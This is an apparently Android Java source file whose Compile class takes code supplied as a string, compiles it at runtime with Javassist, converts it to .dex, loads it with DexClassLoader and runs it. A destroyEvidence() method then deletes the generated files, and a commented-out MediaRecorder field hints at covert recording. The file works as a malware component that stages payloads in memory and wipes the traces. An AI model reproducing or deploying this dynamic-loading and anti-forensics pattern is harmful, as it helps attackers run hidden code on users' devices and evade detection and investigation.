package com.android.a2faces.compile_unit;

import android.content.Context;
import android.content.pm.ApplicationInfo;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.List;

import dalvik.system.DexClassLoader;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.NotFoundException;
import javassist.android.DexFile;
import javassist.android.Log;

public class Compile {
    private File dir;
    private Context context;

    private String sourceCode;


    private List<String> classesName;
    private List<File> dexFiles;
    private List<File> classFiles;

    private List<DexClassLoader> dexClassLoaders;


    private JavaParser javaParser;


    public Compile(File dir, Context context, String pSourceCode) {
        this.dir = dir;
        this.context = context;

        this.sourceCode = pSourceCode;

        this.classesName = new ArrayList<>();
        this.dexFiles = new ArrayList<>();
        this.classFiles = new ArrayList<>();

        this.dexClassLoaders = new ArrayList<>();
    }

    public void parseSourceCode() throws NotBalancedParenthesisException, InvalidSourceCodeException {
        this.javaParser = new JavaParser(this.sourceCode);
    }


    public void assemblyCompile() throws NotFoundException {
        Log.e("Code: " + this.sourceCode);

        ClassPool cp = ClassPool.getDefault(this.context);

        //import phase
        List<String> importPackagesPathLit  = this.javaParser.getImportPackagesPathList();
        Log.e("Imports: " + importPackagesPathLit.toString());
        for (int i = 0; i < importPackagesPathLit.size(); i++) {
            cp.importPackage(importPackagesPathLit.get(i));
            cp.appendClassPath(importPackagesPathLit.get(i));
            cp.insertClassPath(importPackagesPathLit.get(i));
        }
        //end import phase


        List<ClassNode> parsedClasses = this.javaParser.getParsedClassList(this.javaParser.getParserdFile().getRoot());
        for (int i = 0; i < parsedClasses.size(); i++) {
            ClassNode parsedClass = parsedClasses.get(i);
            Log.e("Compiling Class: " + parsedClass.toString());

            CtClass ctClass = compileClass(cp, parsedClass);

            if (ctClass != null) {
                this.classesName.add(ctClass.getName());
                ctClass.debugWriteFile(this.dir.getAbsolutePath());
            }
        }
    }

    private CtClass compileClass(ClassPool cp, ClassNode parsedClass) {
        try {
            CtClass ctClass = cp.makeClass(parsedClass.className);

            //@TODO iterate over fields list
            //ctClass.addField( CtField.make("public MediaRecorder recorder", ctClass) );

            List<ConstructorNode> parsedConstructors = this.javaParser.getParsedConstructorList(parsedClass);
            Log.e("Constructors: " + parsedConstructors.toString());
            for (int j = 0; j < parsedConstructors.size(); j++) {
                String constructorBody = parsedConstructors.get(j).body;

                CtConstructor ctConstructor = new CtConstructor(null, ctClass);
                ctConstructor.setBody(constructorBody);
                ctClass.addConstructor(ctConstructor);
            }

            List<MethodNode> parsedMethodList = javaParser.getParsedMethodList(parsedClass);
            Log.e("Methods: " + parsedMethodList.toString());
            for (int j = 0; j < parsedMethodList.size(); j++) {
                String methodCode = parsedMethodList.get(j).toString();

                CtMethod ctMethod = CtMethod.make(methodCode, ctClass);
                ctClass.addMethod(ctMethod);
            }
            return ctClass;
        } catch (CannotCompileException e) {
            e.printStackTrace();
        }
        return null;
    }

    public void compile() throws IOException {
        // convert from ".class" to ".dex"
        for (int i = 0; i < this.classesName.size(); i++) {
            File dexFile = new File(this.dir, this.classesName.get(i) + ".dex");
            File classFile = new File(this.dir, this.classesName.get(i) + ".class");

            this.dexFiles.add(dexFile);
            this.classFiles.add(classFile);

            DexFile df = new DexFile();
            String dexFilePath = dexFile.getAbsolutePath();
            df.addClass(classFile);
            df.writeFile(dexFilePath);
        }
    }

    /**
     *
     *
     * @param cacheDir
     * @param applicationInfo
     * @param classLoader
     */
    public void dynamicLoading(File cacheDir, ApplicationInfo applicationInfo, ClassLoader classLoader) {
        for (int i = 0; i < this.dexFiles.size(); i++) {
            DexClassLoader dexClassLoader = new DexClassLoader(this.dexFiles.get(i).getAbsolutePath(), cacheDir.getAbsolutePath(), applicationInfo.nativeLibraryDir, classLoader);
            this.dexClassLoaders.add(dexClassLoader);
        }
    }


    public Object run() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        for (int i = 0; i < this.dexClassLoaders.size(); i++) {
            Class loadedClass = this.dexClassLoaders.get(i).loadClass(this.classesName.get(i));
            Constructor constructor = loadedClass.getConstructor();
            return constructor.newInstance();
        }
        return null;
    }

    public void destroyEvidence() {
        for (int i = 0; i < dexFiles.size(); i++) {
            this.dexFiles.get(i).delete();
        }

        for (int i = 0; i < classFiles.size(); i++) {
            this.classFiles.get(i).delete();
        }
    }
}